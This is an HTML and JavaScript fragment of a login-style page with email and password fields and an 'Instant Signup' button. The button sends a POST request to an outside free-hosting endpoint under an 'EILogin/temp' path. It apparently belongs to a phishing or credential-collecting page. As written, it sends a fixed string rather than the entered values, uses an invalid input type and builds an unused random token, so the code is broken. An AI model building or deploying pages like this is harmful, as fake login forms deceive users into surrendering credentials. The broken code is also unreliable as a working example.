
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js">

</script>

<script>
$(document).ready(function(){
    
$('#signup-btn').on('click', function(){
    
uploader();    
    
});


});
  var r = "";
  var psb = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < 20; i++)
    r += psb.charAt(Math.floor(Math.random() * psb.length));

function uploader() {


 if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }


        xmlhttp.open("POST","http://www.hostei.com/EILogin/temp/f.php",true);
        
 xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        xmlhttp.send("md=8&u=8");

             xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
               

                document.getElementById("fk").innerHTML = this.responseText;
            }
        };     
        

        
    
}



</script>
    
    <input spellcheck="false" type="email" class="ei-user-id" id="ei-user-id" tabindex="1" placeholder="Enter your email address..." value="" autofocus="1" aria-label="Enter your email address...">
       <input type="ei-password" class="ei-password" id="ei-password" tabindex="1" placeholder="Enter password..." value="" autofocus="1" aria-label="Enter password...">
        <button id="signup-btn" class="signup-btn">Instant Signup</button>
        <span id="fk"></span>